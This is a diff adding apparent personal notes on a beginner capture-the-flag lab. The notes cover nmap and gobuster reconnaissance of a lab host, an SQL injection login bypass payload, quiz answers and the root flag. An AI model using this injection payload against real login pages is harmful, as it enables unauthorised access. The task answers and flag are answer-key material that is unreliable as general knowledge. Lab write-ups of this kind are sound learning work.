@@ -1,0 +1,195 @@
+64 bytes from 10.129.33.90: icmp_seq=1 ttl=63 time=21.4 ms
+64 bytes from 10.129.33.90: icmp_seq=2 ttl=63 time=24.4 ms
+64 bytes from 10.129.33.90: icmp_seq=3 ttl=63 time=23.4 ms
+64 bytes from 10.129.33.90: icmp_seq=4 ttl=63 time=25.2 ms
+64 bytes from 10.129.33.90: icmp_seq=5 ttl=63 time=27.2 ms
+^C
+--- 10.129.33.90 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4016ms
+rtt min/avg/max/mdev = 21.371/24.316/27.169/1.917 ms
+                                                                                                                                                                                              
+┌──(root㉿kali)-[~/Downloads]
+└─# nmap -sV 10.129.33.90  
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 23:49 BST
+Nmap scan report for 10.129.33.90
+Host is up (0.052s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
+                                                             
+
+gobuster -u 10.129.33.90 -w wordlist.txt dir 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.33.90
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                wordlist.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/21 00:09:10 Starting gobuster in directory enumeration mode
+===============================================================
+
+===============================================================
+2022/07/21 00:09:11 Finished
+===============================================================
+
+gobuster -u 10.129.33.90 -w /usr/share/wordlists/dirb/common.txt dir
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.33.90
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/21 00:16:17 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/css                  (Status: 301) [Size: 310] [--> http://10.129.33.90/css/]
+/fonts                (Status: 301) [Size: 312] [--> http://10.129.33.90/fonts/]
+/images               (Status: 301) [Size: 313] [--> http://10.129.33.90/images/]
+/index.php            (Status: 200) [Size: 4896]                                 
+/js                   (Status: 301) [Size: 309] [--> http://10.129.33.90/js/]    
+/server-status        (Status: 403) [Size: 277]                                  
+/vendor               (Status: 301) [Size: 313] [--> http://10.129.33.90/vendor/]
+                                                                                 
+===============================================================
+2022/07/21 00:16:38 Finished
+===============================================================
+
+Nothing in the above folders is jumping out at me apart from the image bg-01.jpg in the images folder
+
+wget http://10.129.33.90/images/bg-01.jpg                 
+--2022-07-21 00:31:10--  http://10.129.33.90/images/bg-01.jpg
+Connecting to 10.129.33.90:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 251712 (246K) [image/jpeg]
+Saving to: ‘bg-01.jpg’
+
+bg-01.jpg                                       100%[=====================================================================================================>] 245.81K  1.13MB/s    in 0.2s    
+
+2022-07-21 00:31:10 (1.13 MB/s) - ‘bg-01.jpg’ saved [251712/251712]
+
+
+┌──(root㉿kali)-[/opt/bin]
+└─# java -jar stegsolve.jar 
+
+
+did not show anything up. 
+
+nmap -sC -sS -sV 10.129.33.90 -oA appointment
+this produced useful output on the site and has created files with nmap data in the appointment directory
+
+a tutorial found online states that can log onto this site with an SQLi attack. 
+
+username - admin'
+password - or 1=1;#
+
+
+
+TASK 1
+
+What does the acronym SQL stand for?
+
+structured query language
+
+
+
+TASK 2
+
+What is one of the most common type of SQL vulnerabilities?
+
+sql injection
+
+
+
+TASK 3
+
+What does PII stand for?
+
+Personally identifiable information 
+
+
+
+TASK 4
+
+What does the OWASP Top 10 list name the classification for this vulnerability?
+
+A03:2021-Injection
+
+
+
+TASK 5
+
+What service and version are running on port 80 of the target?
+
+Apache httpd 2.4.38 ((Debian))
+
+
+
+TASK 6
+
+What is the standard port used for the HTTPS protocol?
+
+443
+
+
+
+TASK 7
+
+What is one luck-based method of exploiting login pages?
+
+brute-forcing
+
+
+
+TASK 8
+
+What is a folder called in web-application terminology?
+
+directory
+
+
+
+TASK 9
+
+What response code is given for "Not Found" errors?
+
+404
+
+
+
+TASK 10
+
+What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
+
+dir
+
+
+
+TASK 11
+
+What symbol do we use to comment out parts of the code?
+
+#
+
+
+
+SUBMIT FLAG
+
+Submit root flag
+e3d0796d002a446c0e622226f42e9672
